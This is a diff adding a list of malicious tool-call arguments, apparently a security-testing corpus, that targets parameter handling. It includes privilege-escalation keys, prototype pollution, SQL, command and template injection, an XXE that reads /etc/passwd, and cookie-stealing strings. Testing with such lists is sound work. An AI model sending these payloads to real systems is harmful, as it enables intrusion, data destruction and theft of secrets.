@@ -1,0 +1,140 @@
+# ============================================================================
+# Parameter Pollution
+# Injecting extra parameters, overriding defaults, type confusion, JSON
+# injection in string fields, and array expansion attacks in tool calls
+# ============================================================================
+
+# Duplicate parameter with different values
+{"action": "read", "action": "delete"}
+# JSON injection in string field
+{"name": "John\", \"role\": \"admin"}
+# Nested JSON in string parameter
+{"query": "{\"$gt\": \"\", \"admin\": true}"}
+# Array where string expected
+{"username": ["admin", "user", "root"]}
+# Object where string expected
+{"username": {"$ne": ""}}
+# Integer where string expected
+{"username": 1}
+# Boolean where string expected
+{"username": true}
+# Null injection
+{"username": null, "fallback_user": "admin"}
+# Extra field injection
+{"name": "John", "email": "john@test.com", "isAdmin": true, "role": "superuser"}
+# Prototype pollution via __proto__
+{"__proto__": {"isAdmin": true, "role": "admin"}}
+# Constructor pollution
+{"constructor": {"prototype": {"isAdmin": true}}}
+# Array index injection
+{"users[0]": "admin", "users[1]": "root"}
+# Dot notation injection
+{"user.role": "admin", "user.permissions": "all"}
+# Bracket notation injection
+{"user[role]": "admin"}
+# Type coercion exploit (string to number)
+{"amount": "1e308"}
+# Type coercion exploit (string to boolean)
+{"verified": "true", "admin": "1"}
+# Infinity injection
+{"value": Infinity}
+# NaN injection
+{"value": NaN}
+# Negative zero
+{"value": -0}
+# Unicode null in parameter
+{"name": "admin\u0000"}
+# Overlong UTF-8 in parameter
+{"path": "\xc0\xae\xc0\xae/etc/passwd"}
+# Parameter name with special characters
+{"na\nme": "admin", "ro\tle": "superuser"}
+# Duplicate keys with last-wins
+{"role": "user", "extra": "data", "role": "admin"}
+# Case variation parameter duplication
+{"Role": "admin", "role": "user", "ROLE": "superadmin"}
+# Deeply nested parameter
+{"a": {"b": {"c": {"d": {"e": {"f": {"role": "admin"}}}}}}}
+# Array expansion for mass operations
+{"delete_ids": [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]}
+# Wildcard in parameter value
+{"filter": "*", "scope": "all"}
+# Regex in parameter value
+{"search": ".*", "match_type": "regex"}
+# SQL in JSON string field
+{"name": "'; DROP TABLE users; --"}
+# Command injection in JSON string
+{"filename": "test; rm -rf /"}
+# Template literal in parameter
+{"message": "${process.env.SECRET_KEY}"}
+# Server-side template injection
+{"name": "{{7*7}}"}
+# Jinja2 template injection
+{"name": "{{ config.items() }}"}
+# ERB template injection
+{"name": "<%= system('cat /etc/passwd') %>"}
+# XML in JSON string field
+{"data": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"}
+# JSONP callback injection
+{"callback": "alert(document.cookie)//"}
+# Content-Type mismatch
+Send JSON body with Content-Type: application/x-www-form-urlencoded
+# Header injection via parameter
+{"header": "X-Custom: value\r\nX-Admin: true"}
+# HTTP method override parameter
+{"_method": "DELETE"}
+# HTTP method override header
+{"X-HTTP-Method-Override": "DELETE"}
+# Batch operation injection
+{"operations": [{"op": "add", "path": "/role", "value": "admin"}]}
+# JSON Merge Patch injection
+{"role": "admin", "permissions": ["read", "write", "delete", "admin"]}
+# JSON Pointer injection
+{"$ref": "/admin/settings"}
+# Base64 encoded parameter value
+{"data": "eyJyb2xlIjogImFkbWluIiwgIm92ZXJyaWRlIjogdHJ1ZX0="}
+# Hex encoded parameter value
+{"data": "7b22726f6c65223a202261646d696e227d"}
+# URL encoded value in JSON
+{"path": "%2e%2e%2f%2e%2e%2fetc%2fpasswd"}
+# Double encoding in parameter
+{"path": "%252e%252e%252f"}
+# Parameter smuggling via comments
+{"role": "user"/*,"role":"admin"*/}
+# YAML injection in string parameter
+{"config": "role: admin\npermissions: all"}
+# TOML injection in string parameter
+{"config": "role = \"admin\"\nlevel = 999"}
+# INI injection in string parameter
+{"config": "[admin]\nenabled=true\nlevel=999"}
+# Large numeric parameter
+{"id": 99999999999999999999999999999999}
+# Negative value where positive expected
+{"quantity": -1, "price": -100}
+# Float precision exploit
+{"amount": 0.1 + 0.2}
+# Scientific notation
+{"amount": "1e18"}
+# Hexadecimal number
+{"id": "0xDEADBEEF"}
+# Octal number
+{"permissions": "0777"}
+# Binary string
+{"flags": "0b11111111"}
+# Empty object injection
+{"config": {}}
+# Empty array injection
+{"items": []}
+# Sparse array
+{"items": [null, null, null, "admin", null]}
+# Mixed type array
+{"data": [1, "admin", true, null, {"role": "admin"}, [1,2,3]]}
+# Very long string parameter
+{"name": "A" * 1000000}
+# Unicode bidirectional override in value
+{"name": "user\u202Enimda"}
+# Zero-width joiner in parameter
+{"name": "ad\u200Dmin"}
+# Zero-width space in parameter
+{"role": "user\u200B"}
+# Parameter with newlines
+{"query": "SELECT 1;\nDROP TABLE users;"}
